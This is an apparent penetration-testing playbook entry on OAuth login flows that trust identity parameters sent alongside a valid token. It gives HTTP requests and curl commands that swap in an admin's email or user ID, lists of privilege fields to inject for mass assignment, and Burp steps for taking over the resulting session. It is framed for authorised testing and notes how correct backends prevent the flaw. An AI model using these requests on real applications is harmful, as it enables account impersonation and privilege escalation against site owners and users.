# OAuth — Client-Side Parameter Manipulation

## When this applies

- Application validates token but does NOT verify token-to-parameter binding.
- Login flow accepts user identity (email, username, user_id) as a separate parameter alongside the OAuth token.
- Server trusts the parameters without cross-checking against the token's identity claim.

## Technique

The application sends `{"email": user@x.com, "token": access_token}` to its own backend. The backend validates the token (great!) but uses the email parameter from the request body to look up the user — without checking that the token actually belongs to that email. Modify the email/username/user_id while keeping the legitimate token, and impersonate any user.

## Steps

### 1. Capture normal authentication request

```http
POST /authenticate HTTP/1.1
Host: victim.com
Content-Type: application/json

{
  "email": "attacker@example.com",
  "username": "attacker",
  "token": "attacker_access_token"
}
```

### 2. Modify identity parameters

```http
POST /authenticate HTTP/1.1
Host: victim.com
Content-Type: application/json

{
  "email": "admin@victim.com",
  "username": "admin",
  "user_id": "1",
  "role": "administrator",
  "token": "attacker_access_token"
}
```

Same legitimate token, but identity parameters set to victim/admin.

### 3. Identity parameters to try

```json
{"email": "admin@..."}
{"username": "admin"}
{"user_id": "1"}            // Numeric ID; low IDs often = admin
{"id": 1}
{"sub": "admin"}
{"uid": "admin"}
{"oauth_id": "..."}
{"external_id": "..."}
```

### 4. Privilege parameters to inject

```json
{"role": "admin"}
{"is_admin": true}
{"isAdmin": true}
{"permissions": ["*"]}
{"groups": ["admin"]}
```

If the backend trusts these from the request body, mass assignment vulnerability.

### 5. Send via Burp Repeater

```
1. Find /authenticate or /login or /sso/callback request in HTTP history
2. Send to Repeater
3. Modify identity / privilege parameters
4. Send
5. Check Set-Cookie header for new session token
```

### 6. Use "Request in browser" for session establishment

Burp Repeater → response → "Request in browser" → "In current browser session". Burp generates a one-time URL that establishes the modified session in your browser, allowing direct UI interaction as the impersonated user.

### 7. Detect the binding gap

Test with a token that doesn't match the supplied email:

```bash
# Step 1: Authenticate as attacker, capture token
TOKEN=$(curl ... | jq -r .access_token)

# Step 2: Send token + admin email to /authenticate
curl -X POST https://victim.com/authenticate \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@victim.com\",\"token\":\"$TOKEN\"}"
```

If the response sets a session for `admin@victim.com`, the token-to-parameter binding is missing.

### 8. Mass assignment combination

Often the same endpoint accepts EXTRA fields:

```http
POST /authenticate HTTP/1.1

{
  "email": "admin@victim.com",
  "token": "valid_token",
  "is_admin": true,
  "role": "superuser",
  "permissions": ["read","write","delete","admin"]
}
```

The backend may set these on the resulting session/user record without revalidating against any policy.

## Verifying success

- Server response includes a session cookie / JWT for the impersonated user.
- Subsequent requests to `/me`, `/profile`, `/admin` succeed as that user.
- Application UI shows the impersonated identity.

## Common pitfalls

- Properly-implemented backends call `/userinfo` with the token and verify the response's `sub`/`email` matches the request body. Modern frameworks usually do this.
- The OAuth provider's token may be opaque (no readable identity in the token) — backend MUST hit `/userinfo` to validate. Test by sending an attacker-token + victim-email and observing.
- Some apps store the OAuth identity in a JWT they ISSUE; once issued, that JWT is the canonical identity. Manipulation only matters at the issuance step.
- Audit logs may flag the discrepancy — note for the engagement timeline.
- This is essentially a confused-deputy / mass-assignment bug applied to OAuth.

## Tools

- Burp Suite Repeater + "Request in browser" for one-click session takeover.
- Custom Python with `requests.post()`.
- Source code review for `req.body.email` patterns paired with `oauth.validateToken()`.
